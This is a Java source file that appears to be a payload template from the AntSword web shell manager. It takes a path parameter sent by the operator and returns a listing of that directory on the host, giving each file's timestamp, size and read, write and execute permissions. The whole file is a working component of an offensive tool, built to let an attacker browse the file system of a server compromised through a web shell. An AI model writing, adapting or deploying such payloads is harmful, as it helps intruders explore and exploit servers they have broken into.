package filemanager;

import antSword.Template;

import java.io.File;
import java.nio.charset.Charset;
import java.text.SimpleDateFormat;

public class Dir extends Template {
    @Override
    public String run() throws Exception {

        cs = String.valueOf(Charset.forName(System.getProperty("sun.jnu.encoding")));
        String z1 = getParam("antswordargpath");
        return FileTreeCode(z1);

    }

    public String FileTreeCode(String dirPath) throws Exception {
        File oF = new File(dirPath);
        File[] l = oF.listFiles();
        String s = "", sT, sQ, sF = "";
        java.util.Date dt;
        SimpleDateFormat fm = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        for (int i = 0; i < l.length; i++) {
            dt = new java.util.Date(l[i].lastModified());
            sT = fm.format(dt);

            sQ = l[i].canRead() ? "R" : "-";
            sQ += l[i].canWrite() ? "W" : "-";
            try {
                sQ += ((Boolean) l[i].getClass().getMethod("canExecute").invoke(l[i])) ? "X" : "-";
            } catch (Exception e) {
                sQ += "-";
            }
            String nm = l[i].getName();
            if (l[i].isDirectory()) {
                s += nm + "/\t" + sT + "\t" + l[i].length() + "\t" + sQ + "\n";
            } else {
                sF += nm + "\t" + sT + "\t" + l[i].length() + "\t" + sQ + "\n";
            }
        }
        s += sF;
        return s;
    }
}
